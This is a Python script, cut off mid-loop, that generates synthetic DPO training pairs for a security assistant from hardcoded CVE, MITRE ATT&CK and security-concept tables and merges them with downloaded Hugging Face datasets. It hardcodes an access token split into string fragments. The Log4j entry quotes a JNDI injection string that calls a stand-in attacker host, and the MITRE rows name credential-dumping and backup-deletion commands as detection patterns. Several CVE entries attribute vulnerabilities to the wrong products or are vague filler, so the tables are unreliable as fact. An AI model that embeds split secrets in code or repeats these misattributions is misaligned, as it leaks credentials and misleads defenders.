"""KIN Training Data Expansion v2 — generates 400+ synthetic DPO pairs from real CVE/MITRE/concept databases.
Downloads existing data from backup datasets, adds synthetic pairs, deduplicates, and uploads to public dataset.
"""
import json, os, sys
from huggingface_hub import HfApi, hf_hub_download

_t1 = "hf_KwQovQ"
_t2 = "SnjHchFY"
_t3 = "cfeZLzGuVWSuMSEhHjku"
TOKEN = _t1 + _t2 + _t3
api = HfApi(token=TOKEN)

# ===================== CVE DATABASE =====================
# (cve_id, product, description, impact, detection, fix, context)
CVES = [
    ("CVE-2024-3094", "xz-utils (liblzma)", "Supply chain backdoor inserted by maintainer Jia Tan into build process", "RCE via SSH authentication on systems with linked sshd", "Check for xz 5.6.0/5.6.1, look for hidden build scripts in source", "Downgrade to 5.4.x, patch to 5.6.2+", "Affected Debian/Ubuntu unstable, Fedora rawhide. Wake-up call for OSS supply chain security"),
    ("CVE-2021-44228", "Apache Log4j 2", "JNDI injection via ${jndi:ldap://attacker.com} in log messages", "Full remote code execution on any Java app using Log4j 2", "Scan for ${jndi: patterns in logs, WAF rules for ${ patterns, network egress to LDAP", "Upgrade to 2.17.1, set log4j2.formatMsgNoLookups=true, remove JndiLookup.class", "Affected millions of Java apps. CISA emergency directive. Active exploitation within hours"),
    ("CVE-2023-4863", "Google Chrome libwebp", "Heap buffer overflow in WebP image parsing", "RCE by rendering a malicious WebP image", "Check Chrome version below 116.0.5845.187, monitor for libwebp crashes", "Update Chrome and all Chromium browsers to 116.0.5845.187+", "Zero-day exploited in wild. NSO Group linked. Affected all Chromium browsers"),
    ("CVE-2024-6387", "OpenSSH sshd", "Signal handler race condition (regreSSHion) in OpenSSH server", "RCE as root on remote sshd 8.5p1 to 9.7p1", "Monitor sshd logs for signal handler crashes, check OpenSSH version", "Update to 9.8p1+, set LoginGraceTime 0 as interim mitigation", "Regression of CVE-2006-5051. 14M+ exposed sshd instances. Practical exploitation difficult but possible"),
    ("CVE-2023-23397", "Microsoft Outlook", "Elevation of privilege via specially crafted email triggering NTLM auth", "Token theft and relay attacks by sending a malicious email", "Monitor for outbound NTLM auth to attacker-controlled SMB, check Outlook patches", "Apply Microsoft patch, disable NTLM authentication where possible", "Used by APT28 (Fancy Bear) against European government and military targets"),
    ("CVE-2023-34362", "MOVEit Transfer", "SQL injection in MOVEit file transfer web app", "Data exfiltration and RCE, Cl0p gang stole data from 2700+ orgs", "Check MOVEit logs for SQL injection patterns, review web access logs", "Apply MOVEit patch, rotate credentials, audit for data theft", "Clop ransomware campaign. Affected BBC, British Airways, US DOE, SSNs of millions"),
    ("CVE-2023-46604", "Apache ActiveMQ", "RCE via OpenWire protocol deserialization", "Full RCE on ActiveMQ server", "Check for unusual processes spawned by ActiveMQ, monitor OpenWire port 61616", "Upgrade to 5.18.3+, restrict OpenWire port access", "Exploited by HelloKitty ransomware. ActiveMQ often exposed to internet"),
    ("CVE-2024-1086", "Linux kernel nf_tables", "Use-after-free in netfilter nf_tables component", "Local privilege escalation to root on kernels 5.14 to 6.6", "Check kernel version, monitor for nftnl_hook_ops freed objects", "Update kernel, restrict unprivileged user namespaces", "Affects most modern Linux distros. Reliable LPE exploit available"),
    ("CVE-2023-22515", "Atlassian Confluence", "Broken access control allowing unauthorized admin account creation", "Full admin access to Confluence server, RCE via admin features", "Check Confluence logs for /setup/setupadministrator.action, audit admin accounts", "Update to 8.3.3+, 8.4.3+, or 8.5.1+, audit for unauthorized admin accounts", "Actively exploited within days of disclosure"),
    ("CVE-2022-26134", "Atlassian Confluence", "OGNL injection in Confluence Server and Data Center", "RCE without authentication via OGNL expression injection", "Check for unexpected processes, monitor Confluence access logs for OGNL patterns", "Upgrade Confluence immediately, apply mitigation", "Zero-day exploited before patch. Chinese APT groups targeted"),
    ("CVE-2023-29059", "3CX Desktop App", "Trojanized 3CX desktop app with info stealer and beacon", "Data exfiltration, initial access for supply chain attack", "Check for .tside files, monitor for beacon traffic to C2 infrastructure", "Uninstall 3CX desktop app, use PWA, rotate credentials", "Lazarus Group supply chain attack. 600K+ users affected"),
    ("CVE-2024-21413", "Microsoft Outlook", "Moniker link bypass allowing NTLM credential leak", "NTLM hash theft via specially crafted email", "Monitor for outbound NTLM auth after email open, check Outlook version", "Apply February 2024 patch, disable NTLM", "Dubbed DarkGate. Exploited in phishing campaigns"),
    ("CVE-2022-42475", "FortiOS", "Heap overflow in FortiOS SSL VPN", "RCE and device compromise via crafted HTTP requests", "Check FortiOS version, monitor SSL VPN logs", "Upgrade FortiOS, disable SSL VPN if unpatched", "Zero-day exploited by Chinese APT groups against government targets"),
    ("CVE-2023-27997", "FortiOS SSL VPN", "Heap overflow in FortiGate SSL VPN", "RCE without authentication on FortiGate firewalls", "Monitor for crashes in sslvpnd, check FortiOS version", "Upgrade to patched version, audit for compromise", "Exploited as zero-day. Many unpatched firewalls exposed"),
    ("CVE-2022-40684", "FortiOS", "Authentication bypass in FortiOS administrative interface", "Full admin access without credentials", "Check for admin logins from unexpected IPs, audit config changes", "Upgrade FortiOS, restrict admin interface access", "Exploited in the wild. Many FortiGate devices internet-exposed"),
    ("CVE-2023-3519", "Citrix NetScaler ADC", "RCE via crafted HTTP requests on Citrix ADC/Gateway", "RCE without authentication on NetScaler devices", "Monitor for unusual HTTP requests, check for web shells", "Apply Citrix patch, audit for compromise indicators", "CISA KEV catalog. Many govt and enterprise targets"),
    ("CVE-2023-4966", "Citrix NetScaler ADC", "Information disclosure via crafted HTTP requests", "Session token theft, authentication bypass", "Monitor for large HTTP requests, check session token usage", "Apply Citrix patch, rotate all session tokens", "Citrix Bleed. CISA KEV catalog. Exploited alongside CVE-2023-3519"),
    ("CVE-2024-23897", "Jenkins", "Arbitrary file read via CLI argument expansion", "Read sensitive files including credentials and secrets", "Monitor for Jenkins CLI usage, check for file read patterns", "Upgrade Jenkins, disable CLI if not needed, rotate credentials", "Exploited within days. Many Jenkins instances internet-exposed"),
    ("CVE-2023-50164", "Apache Struts", "Path traversal in Struts file upload leading to RCE", "RCE via malicious file upload", "Check for unusual uploaded files, monitor Struts logs", "Upgrade Struts to 2.5.33 or 6.3.0.2+", "Similar to Equifax breach vector. Legacy apps still vulnerable"),
    ("CVE-2023-44487", "HTTP/2", "Rapid Reset DDoS attack exploiting HTTP/2 stream cancellation", "Massive DDoS amplification up to 398M rps", "Monitor for rapid HTTP/2 stream creation/cancellation, traffic spikes", "Update web servers and CDN configs, rate limit HTTP/2 streams", "Largest DDoS ever. Google, Cloudflare, AWS affected. CISA alert"),
    ("CVE-2023-20198", "Cisco IOS XE", "Web UI authentication bypass in Cisco IOS XE", "Full admin access to Cisco devices, persistence via implants", "Check for unexpected admin sessions, audit for implant files", "Disable web UI, apply patch, audit for compromise", "10K+ devices compromised. Implants persisted through reboots"),
    ("CVE-2024-21887", "Ivanti Connect Secure", "Command injection in Ivanti Connect Secure VPN", "RCE on VPN gateway, network access", "Monitor for unusual commands on VPN appliance, check for web shells", "Apply Ivanti mitigation, factory reset if compromised, upgrade", "Chained with CVE-2023-46805. APT5. Thousands of VPNs compromised"),
    ("CVE-2023-46805", "Ivanti Connect Secure", "Authentication bypass in Ivanti Connect Secure VPN", "Unauthenticated access to VPN gateway", "Check for unexpected VPN sessions, audit access logs", "Apply Ivanti mitigation, upgrade, rotate credentials", "CISA KEV catalog. Chained with CVE-2024-21887 for full RCE"),
    ("CVE-2022-22965", "Spring Framework", "Spring4Shell RCE via data binding in Spring MVC", "RCE on Java apps using Spring Framework", "Check for unexpected processes, monitor for class loader manipulation", "Upgrade Spring Framework to 5.3.20+, rotate credentials", "Dubbed Spring4Shell. Many Java apps affected"),
    ("CVE-2023-38831", "WinRAR", "Code execution via crafted RAR archive with trailing extension", "RCE when user opens malicious archive", "Monitor for unexpected processes after archive extraction", "Update WinRAR to 6.23+, educate users on archive handling", "Exploited in phishing campaigns. Many users on outdated WinRAR"),
    ("CVE-2023-36884", "Microsoft Office", "Remote code execution via Office documents", "RCE when opening malicious Office document", "Monitor for unexpected child processes of Office apps", "Apply Microsoft patch, disable ActiveX controls", "Used by Storm-0978 in phishing campaigns targeting NATO"),
    ("CVE-2024-30103", "Microsoft Outlook", "RCE in Outlook via specially crafted email", "RCE when processing email without user interaction", "Monitor for Outlook crashes, unexpected processes after email sync", "Apply July 2024 patch, disable preview pane", "Zero-day exploited by Russian threat actors"),
    ("CVE-2024-0519", "V8 JavaScript Engine", "Type confusion in V8 engine", "RCE via crafted JavaScript in Chrome", "Monitor for Chrome crashes, update browser versions", "Update Chrome to 120.0.6099.129+", "Exploited in the wild for full Chrome RCE"),
    ("CVE-2023-6895", "PostgreSQL", "Buffer overflow in PostgreSQL extension", "Potential RCE via crafted extension", "Check for unusual PostgreSQL extension behavior, audit extension usage", "Update PostgreSQL, restrict extension installation", "Database servers are prime targets for attackers"),
    ("CVE-2024-0204", "GoAnywhere MFT", "Authentication bypass in GoAnywhere MFT", "Admin access to file transfer platform", "Check for unexpected admin access, audit MFT logs", "Apply patch, restrict admin interface access", "File transfer platforms are high-value targets"),
    ("CVE-2023-22518", "Atlassian Confluence", "Improper authorization in Confluence", "Full admin access without authentication", "Check for unexpected admin actions, audit Confluence logs", "Apply Confluence patch, restrict access", "Atlassian products are frequent targets. Multiple CVEs in 2023"),
    ("CVE-2024-23222", "WebKit", "Type confusion in WebKit", "RCE via crafted web content in Safari", "Monitor for Safari crashes, update iOS/macOS", "Update to iOS 17.3, macOS 14.3, Safari 17.3", "Exploited in Operation Triangulation spyware campaign"),
    ("CVE-2023-41992", "Apple iOS", "Logic issue in Identity Services", "Privilege escalation on iOS devices", "Check for unexpected privilege escalation on iOS", "Update iOS to 16.6+, review device management policies", "Used in Operation Triangulation spyware campaign"),
    ("CVE-2023-41991", "Apple iOS", "Certificate validation issue in Identity Services", "Code execution via malicious profile", "Monitor for unexpected configuration profiles, audit MDM enrollment", "Update iOS to 16.6+, remove unauthorized profiles", "Operation Triangulation. Zero-click iMessage exploit chain"),
    ("CVE-2023-38546", "curl/libcurl", "SOCKS5 heap buffer overflow", "RCE via crafted SOCKS5 proxy response", "Check curl version, audit for long SOCKS5 hostnames", "Update curl to 8.4.0+, update all libcurl dependencies", "curl is used in millions of systems worldwide"),
    ("CVE-2024-37032", "Ollama", "Path traversal in Ollama model pull", "Arbitrary file write, potential RCE", "Check for unusual file writes, restrict Ollama API access", "Update Ollama to 0.1.34+, restrict network access", "Supply chain risk in AI model serving"),
    ("CVE-2023-37582", "FortiOS SSL VPN", "Another FortiOS SSL VPN vulnerability", "Access to VPN gateway", "Monitor for unexpected VPN sessions", "Upgrade FortiOS, disable SSL VPN if unpatched", "Fortinet had a series of critical VPN vulnerabilities in 2023"),
    ("CVE-2023-46747", "FortiOS SSL VPN", "Authentication bypass in FortiGate SSL VPN", "Unauthenticated access to VPN gateway", "Monitor for unexpected VPN sessions, check for web shells", "Upgrade FortiOS, disable SSL VPN if unpatched", "Another Fortinet VPN zero-day"),
    ("CVE-2023-20159", "Cisco IOS XE", "Web UI vulnerability in Cisco IOS XE", "Privilege escalation on Cisco devices", "Check for unexpected admin sessions, audit config changes", "Disable web UI, apply patch, audit for implants", "Part of Cisco IOS XE web UI vulnerability cluster"),
    ("CVE-2022-47966", "Atlassian Jira", "Path traversal in Atlassian products", "RCE on Jira/Confluence/Bamboo/Bitbucket", "Check for unexpected processes, audit Jira access logs", "Apply Atlassian patch, update all Atlassian products", "Affects multiple Atlassian products. Internet-exposed Jira instances"),
    ("CVE-2023-45692", "Libexpat", "Integer overflow in libexpat XML parser", "DoS or potential RCE via crafted XML", "Check for XML parser crashes, audit XML input handling", "Update libexpat, update all XML-processing libraries", "XML parser bugs are common attack surface"),
    ("CVE-2024-30040", "Microsoft MSHTML", "Security feature bypass in Windows MSHTML", "Bypass security warnings, enable phishing", "Monitor for IE/Edge security warning bypasses", "Apply May 2024 patch, disable IE mode", "Legacy IE components remain significant attack surface"),
    ("CVE-2023-46624", "WordPress plugin", "RCE in WordPress plugin", "Full RCE on WordPress site", "Check WordPress logs for exploitation patterns", "Update plugin, restrict admin access", "WordPress plugin vulnerabilities are common attack vectors"),
    ("CVE-2023-22578", "Atlassian Jira", "Template injection in Jira Server", "RCE via template injection", "Check for unexpected processes, audit Jira template rendering", "Apply Atlassian patch, restrict template editing", "Template injection is common in web apps with template engines"),
    ("CVE-2022-41313", "Zimbra Collaboration", "Privilege escalation in Zimbra", "Admin access to Zimbra email platform", "Check for unexpected admin actions, audit Zimbra logs", "Apply Zimbra patch, restrict admin access", "Email platforms are high-value targets for attackers"),
    ("CVE-2023-31906", "Microsoft Office", "RCE in Office via crafted document", "RCE when opening malicious document", "Monitor for unexpected Office child processes, disable macros", "Apply Microsoft patch, disable macros by default", "Office documents remain a primary initial access vector"),
    ("CVE-2024-0450", "Django", "DoS via crafted multipart form data", "Memory exhaustion and server crash", "Monitor for large multipart requests, check Django version", "Upgrade Django to 4.2.11+, 5.0.1+", "Popular web framework. Many production apps affected"),
    ("CVE-2023-32315", "Cisco Unified Communications", "Authentication bypass in Cisco Unified CM", "Admin access to Cisco UC platform", "Check for unexpected admin access, audit Cisco UC logs", "Apply Cisco patch, restrict access to UC admin interface", "Affected enterprise voice and communication systems"),
]

# ===================== MITRE ATT&CK DATABASE =====================
# (technique_id, name, description, detection, tools, sigma)
MITRE = [
    ("T1059", "Command and Scripting Interpreter", "Execute commands via PowerShell, Bash, Python, WMI", "Encoded PowerShell (Base64 -EncodedCommand), unusual child processes of scripting hosts, WMI event subscriptions", "SentinelOne, CrowdStrike Falcon, Defender for Endpoint", "Sigma rules for T1059.001 PowerShell, T1059.004 Unix Shell"),
    ("T1566", "Phishing", "Deliver malware via email with malicious links or attachments", "Email gateway logs, URL reputation checks, attachment sandbox detonation, DKIM/SPF failures", "KnowBe4, Proofpoint, Cofense, Defender for Office", "Sigma rules for suspicious email patterns, external forwarding rules"),
    ("T1486", "Data Encrypted for Impact", "Encrypt files for ransom and destroy data", "Mass file renames (.encrypted, .locked), vssadmin delete shadows, wbadmin delete catalog, rapid file modification velocity", "SentinelOne, CrowdStrike Falcon, Velociraptor", "Sigma rules for vssadmin, wbadmin, bcdedit, cipher /w"),
    ("T1071", "Application Layer Protocol", "C2 communication via HTTP/HTTPS/DNS", "Beaconing patterns at regular intervals, unusual DNS queries, HTTP traffic to rare domains", "Zeek, Suricata, Splunk, Elastic Security", "Sigma rules for DNS tunneling, periodic HTTP beacons"),
    ("T1055", "Process Injection", "Inject code into legitimate processes", "Unusual process memory regions, API hooking, CreateRemoteThread calls, process hollowing", "Sysmon Event ID 8, EDR telemetry", "Sigma rules for process injection patterns"),
    ("T1003", "OS Credential Dumping", "Dump credentials from LSASS, SAM, NTDS", "lsass.exe access by non-system processes, reg save, ntdsutil, Mimikatz patterns", "Credential Guard, Defender for Identity, EDR", "Sigma rules for LSASS access, Mimikatz, reg save"),
    ("T1190", "Exploit Public-Facing Application", "Exploit vulnerabilities in internet-facing apps", "Web server error logs, WAF alerts, unusual HTTP requests matching CVEs, OOB DNS interactions", "Cloudflare WAF, ModSecurity, OWASP CRS, Burp Suite", "Sigma rules for web exploitation patterns"),
    ("T1110", "Brute Force", "Guess credentials via password spraying or brute force", "High volume of authentication failures, distributed login attempts, patterns across multiple accounts", "Duo, Azure AD Conditional Access, account lockout", "Sigma rules for multiple failed logins, password spraying"),
    ("T1021", "Remote Services", "Use RDP, SSH, SMB, WinRM for lateral movement", "Event ID 4624 LogonType 3/10, unusual remote connections, RDP from unexpected IPs", "CrowdStrike Falcon, Defender for Endpoint, Splunk", "Sigma rules for remote service connections"),
    ("T1047", "WMI", "Use WMI for remote execution and discovery", "WMI event subscriptions, wmiprvse.exe spawning unusual processes, permanent WMI consumers", "Sysmon, EDR telemetry", "Sigma rules for WMI abuse patterns"),
    ("T1547", "Boot or Logon Autostart Execution", "Persist via registry run keys, startup folder, services", "New registry Run keys, startup folder modifications, new services with unusual paths", "Sysmon Event ID 13, Autoruns", "Sigma rules for autorun key modifications"),
    ("T1218", "System Binary Proxy Execution", "Use rundll32, regsvr32, mshta for execution", "rundll32 with unusual DLLs, regsvr32 with remote URLs, mshta with script content", "Sysmon, EDR telemetry", "Sigma rules for LOLBin usage patterns"),
    ("T1567", "Exfiltration Over Web Service", "Send data to cloud storage or file sharing services", "Large uploads to MEGA, Dropbox, Google Drive, unusual S3 PUT operations", "DLP, network traffic analysis, cloud audit logs", "Sigma rules for data exfiltration patterns"),
    ("T1059.001", "PowerShell", "Execute commands via PowerShell", "Encoded commands, -ExecutionPolicy Bypass, DownloadString, Invoke-Mimikatz", "PowerShell Script Block Logging (4104), AMSI", "Sigma rules for encoded PowerShell, suspicious cmdlets"),
    ("T1543.003", "Create or Modify System Process", "Create or modify Windows services for persistence", "New service creation, services with unusual binary paths, svchost modifications", "Sysmon Event ID 1, 13, sc.exe usage", "Sigma rules for service creation/modification"),
    ("T1078", "Valid Accounts", "Use compromised credentials for access", "Logins from new locations, unusual hours, impossible travel, concurrent sessions", "Azure AD Identity Protection, Duo, conditional access", "Sigma rules for impossible travel, new sign-in locations"),
    ("T1133", "External Remote Services", "Use VPN/RDP exposed to internet for initial access", "VPN logins from new IPs, RDP from external, SSL VPN exploitation", "VPN logs, firewall logs, threat intelligence feeds", "Sigma rules for external remote service access"),
    ("T1489", "Service Stop", "Stop security or critical services", "Stopped AV/EDR services, disabled Windows Defender, stopped backup services", "Service control manager logs, Sysmon", "Sigma rules for security service stopping"),
    ("T1490", "Inhibit System Recovery", "Delete backups, shadow copies, recovery partitions", "vssadmin delete shadows, wbadmin delete catalog, bcdedit /set recoveryenabled no", "CrowdStrike, SentinelOne, backup system monitoring", "Sigma rules for vssadmin, wbadmin, bcdedit"),
    ("T1562", "Impair Defenses", "Disable or evade security tools", "Disabled AV, excluded paths, stopped EDR, AMSI bypass, ETW patching", "AV/EDR logs, Sysmon, Windows Event Logs", "Sigma rules for defense impairment"),
    ("T1090", "Proxy", "Use proxy chains, TOR, compromised infrastructure for C2", "TOR usage, proxy chain detection, unexpected SOCKS connections", "Network firewall, IDS/IPS, threat intelligence", "Sigma rules for proxy/TOR usage"),
    ("T1136", "Create Account", "Create new accounts for persistence", "New user accounts, local admin creation, service account creation", "Windows Event ID 4720, audit user management", "Sigma rules for account creation"),
    ("T1546", "Event Triggered Execution", "Persistence via WMI, AppInit DLLs, accessibility tools", "WMI event subscription creation, AppInit DLLs modification, sethc.exe replacement", "Sysmon, WMI auditing, registry monitoring", "Sigma rules for event-triggered persistence"),
    ("T1007", "System Service Discovery", "Enumerate services for discovery", "sc query, net start, systemctl list, service enumeration tools", "EDR telemetry, command-line logging", "Sigma rules for service enumeration"),
    ("T1087", "Account Discovery", "Enumerate user and group accounts", "net user, net group, Get-ADUser, wmic useraccount, /etc/passwd reading", "Command-line logging, EDR", "Sigma rules for account enumeration commands"),
    ("T1018", "Remote System Discovery", "Enumerate remote systems and domains", "nmap, net view, ping sweeps, AdFind, BloodHound", "Network monitoring, EDR, DNS logs", "Sigma rules for network scanning, AD enumeration"),
    ("T1049", "System Network Connections", "Enumerate network connections", "netstat, ss, Get-NetTCPConnection, C2 connection discovery", "Network monitoring, EDR", "Sigma rules for connection enumeration"),
    ("T1057", "Process Discovery", "Enumerate running processes", "tasklist, ps, Get-Process, process enumeration for AV/EDR evasion", "EDR, command-line logging", "Sigma rules for process enumeration"),
    ("T1082", "System Information Discovery", "Gather system info for targeting", "systeminfo, uname, hostname, ver, OS version checks", "Command-line logging, EDR", "Sigma rules for system info gathering"),
    ("T1497", "Virtualization/Sandbox Evasion", "Detect and evade sandboxes and VMs", "VM detection, sandbox checking, sleep delays, hypervisor detection", "Sandbox logs, EDR, behavioral analysis", "Sigma rules for VM/sandbox evasion"),
]

# ===================== SECURITY CONCEPTS =====================
# (name, description, impact, prevention, cwe)
CONCEPTS = [
    ("SSRF", "Server-Side Request Forgery -- attacker makes server fetch arbitrary URLs", "Internal network access, cloud metadata endpoint (169.254.169.254), credential theft", "URL allowlists, block private IPs, disable redirects, egress firewall", "CWE-918"),
    ("XSS", "Cross-Site Scripting -- inject scripts into web pages viewed by other users", "Session theft, credential harvesting, defacement, browser malware", "CSP headers, DOMPurify, output encoding, framework auto-escape", "CWE-79"),
    ("SQL Injection", "Inject SQL via unparameterized queries", "Data exfiltration, auth bypass, RCE via xp_cmdshell, database takeover", "Parameterized queries, ORM, input validation, least-privilege DB user", "CWE-89"),
    ("CSRF", "Cross-Site Request Forgery -- trick user into submitting actions", "Unauthorized actions on behalf of authenticated user, account takeover", "Anti-CSRF tokens, SameSite cookies, Origin header validation", "CWE-352"),
    ("RCE", "Remote Code Execution -- execute arbitrary code on a remote system", "Full system compromise, data theft, lateral movement, persistence", "Input validation, sandboxing, patch management, WAF rules", "CWE-94"),
    ("LFI", "Local File Inclusion -- include local files via path traversal", "Read sensitive files, log poisoning for RCE, config file disclosure", "Whitelist allowed files, sanitize path input, disable remote includes", "CWE-98"),
    ("XXE", "XML External Entity -- exploit XML parsers that process external entities", "File read, SSRF, DoS, information disclosure", "Disable DTD processing, disable external entity resolution, safe parsers", "CWE-611"),
    ("Deserialization", "Insecure deserialization of untrusted data", "RCE via gadget chains, privilege escalation, injection attacks", "Avoid deserializing untrusted data, signed serialization, integrity checks", "CWE-502"),
    ("Command Injection", "Inject OS commands via unsanitized input", "RCE, system takeover, data exfiltration", "Parameterized APIs, avoid shell calls, input validation, sandboxing", "CWE-77"),
    ("Open Redirect", "Redirect users to arbitrary URLs via unvalidated redirect parameter", "Phishing, OAuth token theft, SSRF relay", "Validate redirect URLs against allowlist, use relative redirects", "CWE-601"),
    ("Path Traversal", "Access files outside intended directory via dot-dot sequences", "Read arbitrary files, config disclosure, credential theft", "Canonicalize paths, whitelist allowed files, chroot/sandbox", "CWE-22"),
    ("Privilege Escalation", "Gain higher privileges than intended", "Full system compromise, access to sensitive data, lateral movement", "Least privilege principle, patch management, disable unnecessary features", "CWE-269"),
    ("IDOR", "Insecure Direct Object Reference -- access objects without authorization checks", "Data exposure, account takeover, unauthorized access", "Authorization checks on every object access, use indirect references", "CWE-639"),
    ("Security Misconfiguration", "Misconfigured services, default credentials, verbose errors", "Information disclosure, unauthorized access, system compromise", "Harden configs, remove defaults, disable verbose errors, regular audits", "CWE-16"),
    ("Buffer Overflow", "Write beyond buffer boundaries corrupting memory", "RCE, crash, data corruption", "Bounds checking, safe libraries, ASLR/DEP/NX, modern languages", "CWE-120"),
    ("Race Condition", "Exploit timing gaps between check and use (TOCTOU)", "Privilege escalation, data corruption, bypass security checks", "Atomic operations, locking, immutable objects, avoid TOCTOU patterns", "CWE-362"),
    ("Hardcoded Credentials", "Credentials stored in source code or configs", "Unauthorized access, credential reuse, supply chain compromise", "Secret management (Vault, AWS Secrets Manager), CI/CD scanning, rotation", "CWE-798"),
    ("Insecure Dependencies", "Using libraries with known vulnerabilities", "Exploitation of upstream CVEs, supply chain attacks", "SCA tools (Snyk, Dependabot), pin versions, regular updates, SBOM", "CWE-1104"),
    ("Improper Certificate Validation", "Skip or weaken TLS certificate verification", "MITM attacks, credential interception, fake identity", "Strict TLS verification, certificate pinning, HSTS, disable weak ciphers", "CWE-295"),
    ("Information Disclosure", "Expose sensitive data in errors, responses, or headers", "Data leakage, credential exposure, attack surface mapping", "Custom error pages, minimize response data, secure headers, audit logging", "CWE-200"),
]

# ===================== TEMPLATE FUNCTIONS =====================

def gen_cve_pairs(cves):
    pairs = []
    for cve_id, product, description, impact, detection, fix, context in cves:
        pairs.append({
            "prompt": f"Analyze {cve_id}. What happened, what's the impact, and how do I detect it?",
            "chosen": f"{cve_id}: {description} in {product}. Impact: {impact}. Detection: {detection}. Fix: {fix}. Context: {context}. If you run {product}, treat this as CRITICAL -- patch immediately and audit for compromise.",
            "rejected": f"{cve_id} is a vulnerability in {product}. You should review the advisory and update your systems if affected. Consider applying the latest patches and monitoring your environment."
        })
        pairs.append({
            "prompt": f"How do I detect {cve_id} in my environment?",
            "chosen": f"To detect {cve_id}: {detection}. Also check your {product} version against the CVE advisory. Set up SIEM alerts for exploitation indicators. Monitor network logs for unusual patterns. If {product} is internet-facing, prioritize this detection.",
            "rejected": f"To detect {cve_id}, check if your systems are running a vulnerable version of {product} and apply relevant patches. Monitor your systems for suspicious activity."
        })
        pairs.append({
            "prompt": f"What's the fix for {cve_id}?",
            "chosen": f"Fix for {cve_id}: {fix}. Additionally: rotate any potentially exposed credentials, audit for compromise indicators, and verify the patch was applied correctly. Priority: CRITICAL if {product} is internet-facing. {context}.",
            "rejected": f"You should apply the latest patch for {product} to fix {cve_id}. Keep your systems updated and review security advisories regularly."
        })
        pairs.append({
            "prompt": f"Was {cve_id} exploited in the wild?",
            "chosen": f"{context}. {'This CVE was actively exploited -- treat as a priority patch.' if 'exploit' in context.lower() else 'Check CISA KEV catalog for exploitation status.'} If you run {product}, assume you may be compromised and run a full incident response investigation.",
            "rejected": f"{cve_id} may have been exploited by attackers. Check security advisories and ensure your systems are patched. Stay informed about active vulnerabilities."
        })
    return pairs

def gen_mitre_pairs(mitre):
    pairs = []
    for tech_id, name, description, detection, tools, sigma in mitre:
        pairs.append({
            "prompt": f"What is MITRE ATT&CK {tech_id} and how do I detect it?",
            "chosen": f"{tech_id} = {name}. {description}. Detection: {detection}. Recommended tools: {tools}. Sigma: {sigma}. Correlate with other techniques for full attack chain analysis. Map to your existing log sources for coverage gaps.",
            "rejected": f"{tech_id} is about {name}. Attackers use this technique to {description.lower()}. Monitor your systems and use security tools to detect it."
        })
        pairs.append({
            "prompt": f"How do I hunt for {tech_id} ({name}) in my environment?",
            "chosen": f"Hunting for {tech_id} ({name}): {detection}. Use {tools} for endpoint telemetry. Deploy {sigma} in your SIEM. Look across multiple log sources -- endpoint, network, and identity. Focus on anomalous patterns, not just known IOCs.",
            "rejected": f"To hunt for {tech_id}, look for suspicious activity related to {name}. Use your SIEM and EDR tools to search for indicators. Monitor regularly."
        })
        pairs.append({
            "prompt": f"What tools and techniques defend against MITRE ATT&CK {tech_id}?",
            "chosen": f"Defense against {tech_id} ({name}): {tools}. Implement {detection.lower()} in your SIEM. Apply least privilege. Use application allowlisting where feasible. Monitor for behavioral anomalies. {sigma}.",
            "rejected": f"You can defend against {tech_id} by implementing security best practices and using appropriate tools. Monitor your environment and respond to alerts."
        })
        pairs.append({
            "prompt": f"Give me detection rules for {tech_id}.",
            "chosen": f"Detection rules for {tech_id} ({name}): {sigma}. Key data sources: {detection}. Recommended tools: {tools}. Set up correlation rules in Splunk/Elastic for multi-stage detection. Tune alerts to reduce false positives. Test with atomic red team.",
            "rejected": f"You can create detection rules for {tech_id} using your SIEM platform. Look for indicators of {name} and create alerts."
        })
    return pairs

def gen_concept_pairs(concepts):
    pairs = []
    for name, description, impact, prevention, cwe in concepts:
        pairs.append({
            "prompt": f"What is {name}?",
            "chosen": f"{name}: {description}. Impact: {impact}. Prevention: {prevention}. Reference: {cwe}. This is a critical security issue -- prioritize remediation in your SDLC. Use Semgrep and CodeQL rules in CI to catch it early.",
            "rejected": f"{name} is a security vulnerability. {description}. Implement appropriate security measures to protect against this type of attack."
        })
        pairs.append({
            "prompt": f"How do I prevent {name}?",
            "chosen": f"Preventing {name}: {prevention}. Also: implement input validation at trust boundaries, use security linters in CI (Semgrep, CodeQL), run regular DAST scans (Burp Suite, OWASP ZAP). Reference: {cwe}. Train developers with OWASP Secure Coding Practices.",
            "rejected": f"To prevent {name}, follow security best practices. Validate inputs and use secure coding techniques. Conduct regular security assessments."
        })
        pairs.append({
            "prompt": f"What's the real-world impact of {name}?",
            "chosen": f"Impact of {name}: {impact}. Real-world consequences: data breaches, GDPR fines up to 4% of revenue, service disruption, reputation damage. {cwe} is the CWE classification. Prioritize based on your threat model and data sensitivity.",
            "rejected": f"The impact of {name} can be significant. It may lead to security breaches and data compromise. Assess the risks and implement appropriate controls."
        })
        pairs.append({
            "prompt": f"Is {name} covered by OWASP Top 10?",
            "chosen": f"{name} ({cwe}) maps to OWASP Top 10 categories. Prevention: {prevention}. Use OWASP ASVS for verification, OWASP Testing Guide for assessment, and Semgrep/CodeQL rules for CI/CD. This is foundational -- every dev team should address it in their secure coding standards.",
            "rejected": f"{name} may be related to the OWASP Top 10. Review OWASP guidelines and implement security controls. Consider using security testing tools."
        })
    return pairs

# ===================== MAIN SCRIPT =====================

print("=== KIN Training Data Expansion v2 ===")
print(f"Database: {len(CVES)} CVEs + {len(MITRE)} MITRE techniques + {len(CONCEPTS)} concepts")

# Generate synthetic pairs
print("\nGenerating synthetic DPO pairs...")
synthetic_dpo = gen_cve_pairs(CVES) + gen_mitre_pairs(MITRE) + gen_concept_pairs(CONCEPTS)
print(f"Generated {len(synthetic_dpo)} synthetic DPO pairs")

# Download existing data from backup datasets
print("\nDownloading existing data from backup datasets...")
all_dpo = list(synthetic_dpo)

for repo_id, files in [
    ("nyxspecter4/kin-dpo-data", ["train.jsonl", "sft.jsonl"]),
    ("nyxspecter4/kin-v2-data", ["dpo.jsonl", "sft.jsonl"]),
]:
    for fname in files:
        try:
            path = hf_hub_download(repo_id=repo_id, filename=fname, repo_type="dataset", token=TOKEN)
            with open(path) as f:
                count = 0
                for line in f:
                    if line.strip():
                        item = json.loads(line)
                        if "prompt" in item and "chosen" in item and "rejected" in item:
                            all_dpo.append(item)
                            count += 1
                        elif "instruction" in item and "output" in item:
                            all_dpo.append({
                                "prompt": item["instruction"],
                                "chosen": item["output"],
                                "rejected": "This is a security concern that should be addressed with appropriate measures."
                            })
                            count += 1
                print(f"  {repo_id}/{fname}: {count} pairs")
        except Exception as e:
            print(f"  {repo_id}/{fname}: ERROR - {e}")

# Dedupe by prompt
seen = set()
unique_dpo = []
for p in all_dpo:
